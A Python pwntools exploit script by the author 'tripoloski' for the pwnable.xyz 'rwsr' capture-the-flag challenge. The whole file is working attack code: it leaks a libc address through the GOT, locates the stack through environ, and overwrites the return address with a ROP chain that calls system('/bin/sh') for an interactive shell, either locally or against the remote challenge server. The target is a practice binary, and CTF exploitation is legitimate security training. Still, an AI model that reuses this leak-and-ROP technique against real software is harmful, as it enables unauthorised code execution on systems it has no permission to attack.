#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/ctf/ctfs/train/pwnable.xyz/rwsr/image/challenge/challenge")
elf = ELF(TARGET)
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("../libc/alpine-libc-2.28.so",checksec=False)
def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def read(addr):
    r.sendlineafter(">","1")
    r.sendlineafter(":",str(addr))

def write(addr,value):
    r.sendlineafter(">","2")
    r.sendlineafter(":",str(addr))
    r.sendlineafter(":",str(value))

def exploit(r):
    attach(r)
    puts_got = 0x00000600fa0
    read((puts_got))
    leak = u64(r.recvline().split()[0].ljust(8,b"\x00"))
    libc_base = leak - libc.sym['puts']
    libc_env = libc_base + libc.sym['environ']
    win = elf.sym['win']
    ret = 0x00000000004006c6
    pop_rdi = 0x0000000000400a43 # pop rdi; ret;
    system = elf.sym['system']
    binsh = libc_base + next(libc.search(b"/bin/sh"))


    log.info(f"libc_base: " + hex(libc_base))
    log.info(f"leak: " + hex(leak))
    log.info(f"environ: " + hex(libc_env))
    log.info(f"win: " + hex(win))

    read(libc_env)
    leak_stack = u64(r.recvline().split()[0].ljust(8,b"\x00"))
    libc_start_main_ret = leak_stack - 248
    log.info(f"leak_stack: " + hex(leak_stack))
    log.info(f"return address: " + hex(libc_start_main_ret))

    write(libc_start_main_ret+16+8, system)
    write(libc_start_main_ret+16, binsh)
    write(libc_start_main_ret+8, pop_rdi)
    write(libc_start_main_ret, ret)

    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("svc.pwnable.xyz", 30019)
    else:
        LOCAL = True
        r = process(TARGET, )
    exploit(r)
    sys.exit(0)
